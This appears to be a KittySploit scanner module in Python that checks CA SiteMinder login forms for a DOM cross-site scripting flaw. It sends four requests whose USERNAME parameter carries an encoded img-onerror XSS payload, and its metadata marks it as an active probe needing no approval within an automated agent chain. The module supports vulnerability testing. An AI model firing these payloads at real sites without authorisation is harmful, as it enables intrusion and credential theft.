#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""SiteMinder contains a cross-site scripting vulnerability in the document object model."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'SiteMinder - DOM Cross-Site Scripting Detection',
        'description': 'SiteMinder contains a cross-site scripting vulnerability in the document object model. An attacker can execute arbitrary script in the browser of an unsuspecting user in the context of the affected site. This can allow the attacker to steal cookie-based authentication credentials and launch other attacks.',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'vulnerability', 'dom', 'xss', 'siteminder', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 4,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': ['https://blog.reigningshells.com/2019/12/reviving-old-cves-reflected-xss-in-ca.html'],
    }

    def run(self):
        for path in ('/siteminderagent/forms/smpwservices.fcc?USERNAME=\\u003cimg\\u0020src\\u003dx\\u0020onerror\\u003d\\u0022confirm(document.domain)\\u0022\\u003e&SMAUTHREASON=7', '/siteminderagent/forms/smaceauth.fcc?USERNAME=\\u003cimg\\u0020src\\u003dx\\u0020onerror\\u003d\\u0022confirm(document.domain)\\u0022\\u003e&SMAUTHREASON=7', '/siteminderagent/forms/smpwservices.fcc?USERNAME=\\u003cimg\\u0020src\\u003dx\\u0020onerror\\u003d\\u0022confirm\\u0028document.domain\\u0029\\u0022\\u003e&SMAUTHREASON=7', '/siteminderagent/forms/smaceauth.fcc?USERNAME=\\u003cimg\\u0020src\\u003dx\\u0020onerror\\u003d\\u0022confirm\\u0028document.domain\\u0029\\u0022\\u003e&SMAUTHREASON=7'):
            r = self.http_request(method="GET", path=path, allow_redirects=False)
            if not r or r.status_code != 200:
                continue
            body = r.text or ""
            headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
            body_any = ('\\u003d\\u0022confirm(document.domain)\\u0022\\u003e</B> you cannot access your', '\\u003d\\u0022confirm\\u0028document.domain\\u0029\\u0022\\u003e</B> you cannot access your',)
            header_any = ('text/html',)
            if (any(m in body for m in body_any)) and (any(m in headers for m in header_any)):
                self.set_info(
                    severity='high',
                    reason="SiteMinder - DOM Cross-Site Scripting detected",
                    path=path,
                )
                return True
        return False

